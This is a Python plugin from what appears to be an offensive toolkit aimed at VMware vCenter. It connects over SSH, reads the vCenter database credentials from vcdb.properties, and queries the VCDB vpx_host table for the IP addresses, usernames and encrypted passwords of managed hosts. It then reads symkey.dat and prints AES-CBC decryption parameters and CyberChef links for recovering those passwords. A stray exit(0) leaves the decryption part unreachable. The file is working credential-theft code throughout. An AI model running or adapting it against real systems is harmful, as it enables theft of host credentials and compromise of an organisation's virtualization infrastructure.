import argparse
import base64
from copy import copy

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterPSqlQuery(PluginVCenterBase):
    display = "psql 查询"
    alias = "psql_query"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", dest="address")
        parser.add_argument("-u", "--username", help="ssh username", required=True, dest="username")
        parser.add_argument("-p", "--password", help="ssh password", required=True, dest="password")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)
        host = args.address
        username = args.username
        passwd = args.password
        config_file = '/etc/vmware-vpx/vcdb.properties'

        from paramiko.client import SSHClient
        import paramiko
        client = SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=passwd)
        _stdin, _stdout, _stderr = client.exec_command(f"shell cat {config_file}")
        conf = [v.split('=', 1) for v in _stdout.read().decode().split('\n')]

        vc_password = ''
        for it in conf:
            if it[0].strip() == 'password':
                vc_password = it[1].strip().replace('<', '\\\\<').replace('>', '\\\\>')
        assert vc_password is not None

        client.connect(host, username=username, password=passwd)
        cmd = "shell export PGPASSWORD='" + vc_password + "'&&psql --username=vc -d VCDB -c 'select ip_address,user_name," \
                                                          "password from vpx_host;' "
        output.info(cmd)
        _stdin, _stdout, _stderr = client.exec_command(cmd)
        # _stdin.write(b'whoami\n')
        output.info(_stdout.read().decode())
        # [output.info(std.read().decode()) for std in ( _stdout, _stderr)]
        # _stdin.write(b'whoami')

        output.info('[+] psql测试完成')
        exit(0)

        out_str = _stdout.read().decode().split('\n')

        # 解析IP username enc_passwd
        config_list = [l.split('|') for l in out_str if '|' in l]
        ip_user_pass = [(v[0].strip(), v[1].strip(), v[2].strip()[1:]) for v in config_list[1:]]

        cmd = 'shell cat /etc/vmware-vpx/ssl/symkey.dat'
        client.connect(host, username=username, password=passwd)
        _stdin, _stdout, _stderr = client.exec_command(cmd)

        symkey = _stdout.read().decode()
        for i, u, p in ip_user_pass:
            output.info('*' * 60)
            output.info('%-10s:' % 'ip', i)
            output.info('%-10s:' % 'user', u)
            decoded_pass = base64.b64decode(p)
            output.info('%-10s:' % 'iv', decoded_pass[:16].hex())
            output.info('%-10s:' % 'enc_pass', decoded_pass[16:].hex())
            # 解密
            p1 = "{'option':'Hex','string':'%s'},{'option':'Hex','string':'%s'},'CBC','Hex','Raw',{'option':'Hex'," \
                 "'string':''},{'option':'Hex','string':''}" % (symkey.strip(), decoded_pass[:16].hex())
            params = {
                'recipe': f'AES_Decrypt({p1})',
                'input': base64.b64encode(decoded_pass[16:].hex().encode()).decode()
            }
            output.info(f'https://gchq.github.io/CyberChef/#' + '&'.join([f'{k}={v}' for k, v in params.items()]))

            output.info('*' * 60)

        output.info('%-10s:' % 'aeskey', symkey.strip())
        output.info('%-10s:' % 'mode', 'AES/CBC/NoPadding')
        client.close()
        return result
